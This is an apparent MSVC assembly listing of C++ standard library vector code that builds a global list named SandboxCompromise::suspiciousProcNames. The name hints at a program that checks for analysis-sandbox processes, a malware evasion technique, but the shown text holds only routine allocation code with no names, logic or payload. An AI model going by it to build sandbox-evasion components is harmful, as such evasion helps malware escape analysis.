; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN32@vector

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	$LN116@vector

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN42@vector

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN29@vector
$LN32@vector:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
$LN29@vector:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	add	rbx, rax
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rcx, rax
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rbx
$LN78@vector:

; 653  :     }

	lea	rax, OFFSET FLAT:?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A ; SandboxCompromise::suspiciousProcNames
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+64]
	mov	rsi, QWORD PTR [rsp+80]
	add	rsp, 48					; 00000030H
	pop	rdi
	ret	0
$LN42@vector:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN115@vector:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
	int	3
$LN116@vector:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN113@vector:
??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0AEBV?$allocator@PEBD@std@@$$V@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@PEBD@1@@Z
_TEXT	SEGMENT
this$dead$ = 8
__formal$dead$ = 16
_Val1$dead$ = 24
??$?0AEBV?$allocator@PEBD@std@@$$V@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@PEBD@1@@Z PROC ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1><std::allocator<char const *> const &>, COMDAT

; 1501 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	xorps	xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, 0
	movdqu	XMMWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1501 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	lea	rax, OFFSET FLAT:?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A ; SandboxCompromise::suspiciousProcNames
	ret	0
??$?0AEBV?$allocator@PEBD@std@@$$V@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@PEBD@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1><std::allocator<char const *> const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBV?$allocator@PEBD@std@@@std@@YAAEBV?$allocator@PEBD@0@AEBV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBV?$allocator@PEBD@std@@@std@@YAAEBV?$allocator@PEBD@0@AEBV10@@Z PROC ; std::forward<std::allocator<char const *> const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBV?$allocator@PEBD@std@@@std@@YAAEBV?$allocator@PEBD@0@AEBV10@@Z ENDP ; std::forward<std::allocator<char const *> const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@PEBD@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$dead$ = 8
??0?$_Vector_val@U?$_Simple_types@PEBD@std@@@std@@QEAA@XZ PROC ; std::_Vector_val<std::_Simple_types<char const *> >::_Vector_val<std::_Simple_types<char const *> >, COMDAT

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xorps	xmm0, xmm0
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, 0
	movdqu	XMMWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, xmm0
	lea	rax, OFFSET FLAT:?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A ; SandboxCompromise::suspiciousProcNames
	ret	0
??0?$_Vector_val@U?$_Simple_types@PEBD@std@@@std@@QEAA@XZ ENDP ; std::_Vector_val<std::_Simple_types<char const *> >::_Vector_val<std::_Simple_types<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
;	COMDAT ?size@?$initializer_list@PEBD@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?size@?$initializer_list@PEBD@std@@QEBA_KXZ PROC	; std::initializer_list<char const *>::size, COMDAT

; 45   :         return static_cast<size_t>(_Last - _First);

	mov	rax, QWORD PTR [rcx+8]
	sub	rax, QWORD PTR [rcx]
	sar	rax, 3

; 46   :     }

	ret	0
?size@?$initializer_list@PEBD@std@@QEBA_KXZ ENDP	; std::initializer_list<char const *>::size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
;	COMDAT ?begin@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ
_TEXT	SEGMENT
this$ = 8
?begin@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ PROC	; std::initializer_list<char const *>::begin, COMDAT

; 37   :         return _First;

	mov	rax, QWORD PTR [rcx]

; 38   :     }

	ret	0
?begin@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ ENDP	; std::initializer_list<char const *>::begin
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
;	COMDAT ?end@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ
_TEXT	SEGMENT
this$ = 8
?end@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ PROC	; std::initializer_list<char const *>::end, COMDAT

; 41   :         return _Last;

	mov	rax, QWORD PTR [rcx+8]

; 42   :     }

	ret	0
?end@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ ENDP	; std::initializer_list<char const *>::end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
_TEXT	SEGMENT
this$dead$ = 64
_Count$ = 72
<_Val_0>$ = 80
<_Val_1>$ = 88
??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z PROC ; std::vector<char const *,std::allocator<char const *> >::_Construct_n<char const * const *,char const * const *>, COMDAT

; 2060 :     _CONSTEXPR20 void _Construct_n(_CRT_GUARDOVERFLOW const size_type _Count, _Valty&&... _Val) {

$LN109:

; 2061 :         // Dispatches between the three sized constructions.
; 2062 :         // 1-arg -> value-construction, e.g. vector(5)
; 2063 :         // 2-arg -> fill, e.g. vector(5, "meow")
; 2064 :         // 3-arg -> sized range construction, e.g. vector{"Hello", "Fluffy", "World"}
; 2065 :         auto& _Al       = _Getal();
; 2066 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2067 :         auto& _My_data  = _Mypair._Myval2;
; 2068 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2069 :         if (_Count != 0) {

	test	rdx, rdx
	je	$LN104@Construct_
	push	rsi
	push	r14
	sub	rsp, 40					; 00000028H

; 2010 :         if (_Newcapacity > max_size()) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH

; 2060 :     _CONSTEXPR20 void _Construct_n(_CRT_GUARDOVERFLOW const size_type _Count, _Valty&&... _Val) {

	mov	r14, r9
	mov	rsi, r8

; 2010 :         if (_Newcapacity > max_size()) {

	cmp	rdx, rax
	ja	$LN106@Construct_
	mov	QWORD PTR [rsp+64], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rdx*8]
	mov	QWORD PTR [rsp+32], rdi

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	jne	SHORT $LN19@Construct_

; 197  :         return nullptr;

	xor	edi, edi
	jmp	SHORT $LN18@Construct_
$LN19@Construct_:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN21@Construct_

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	SHORT $LN107@Construct_

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN31@Construct_

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	rdi, QWORD PTR [rax+39]
	and	rdi, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rdi-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN18@Construct_
$LN21@Construct_:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
	mov	rdi, rax
$LN18@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	lea	rcx, QWORD PTR [rbx+rdi]
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, rdi
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rcx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rdi

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	rdx, QWORD PTR [rsi]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1804 :     auto _ULast  = _RANGES _Unwrap_sent<_InIt>(_STD move(_Last));

	mov	rbx, QWORD PTR [r14]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rdx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, rbx
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1822 :                 _Dest += _ULast - _UFirst;

	sar	rbx, 3
	lea	rax, QWORD PTR [rdi+rbx*8]
	mov	rbx, QWORD PTR [rsp+64]
	mov	rdi, QWORD PTR [rsp+32]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rax

; 2087 :     }

	add	rsp, 40					; 00000028H
	pop	r14
	pop	rsi
$LN104@Construct_:
	ret	0
$LN31@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN106@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
	int	3
$LN107@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN103@Construct_:
??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::_Construct_n<char const * const *,char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAAEAV?$allocator@PEBD@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAAEAV?$allocator@PEBD@2@XZ PROC ; std::vector<char const *,std::allocator<char const *> >::_Getal, COMDAT

; 2185 :         return _Mypair._Get_first();

	mov	rax, rcx

; 2186 :     }

	ret	0
?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAAEAV?$allocator@PEBD@2@XZ ENDP ; std::vector<char const *,std::allocator<char const *> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAAAEAV?$allocator@PEBD@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAAAEAV?$allocator@PEBD@2@XZ PROC ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Get_first, COMDAT

; 1504 :         return *this;

	mov	rax, rcx

; 1505 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAAAEAV?$allocator@PEBD@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Newcapacity$ = 56
?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z PROC ; std::vector<char const *,std::allocator<char const *> >::_Buy_nonzero, COMDAT

; 1999 :     _CONSTEXPR20 void _Buy_nonzero(const size_type _Newcapacity) {

$LN50:
	sub	rsp, 40					; 00000028H

; 2000 :         // allocate array with _Newcapacity elements
; 2001 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 2002 :         auto& _My_data    = _Mypair._Myval2;
; 2003 :         pointer& _Myfirst = _My_data._Myfirst;
; 2004 :         pointer& _Mylast  = _My_data._Mylast;
; 2005 :         pointer& _Myend   = _My_data._Myend;
; 2006 :         _STL_INTERNAL_CHECK(!_Myfirst && !_Mylast && !_Myend); // check that *this is tidy
; 2007 :         _STL_INTERNAL_CHECK(0 < _Newcapacity);
; 2008 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 2009 : 
; 2010 :         if (_Newcapacity > max_size()) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	cmp	rdx, rax
	ja	SHORT $LN48@Buy_nonzer
	mov	QWORD PTR [rsp+32], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rdx*8]

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	jne	SHORT $LN15@Buy_nonzer

; 197  :         return nullptr;

	xor	eax, eax
	jmp	SHORT $LN14@Buy_nonzer
$LN15@Buy_nonzer:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN17@Buy_nonzer

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	SHORT $LN49@Buy_nonzer

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN27@Buy_nonzer

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN14@Buy_nonzer
$LN17@Buy_nonzer:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
$LN14@Buy_nonzer:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, rax

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rax

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	add	rax, rbx
	mov	rbx, QWORD PTR [rsp+32]
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rax

; 2015 :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN48@Buy_nonzer:

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
	int	3
$LN49@Buy_nonzer:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN27@Buy_nonzer:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN46@Buy_nonzer:
?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::_Buy_nonzero
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?max_size@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEBA_KXZ
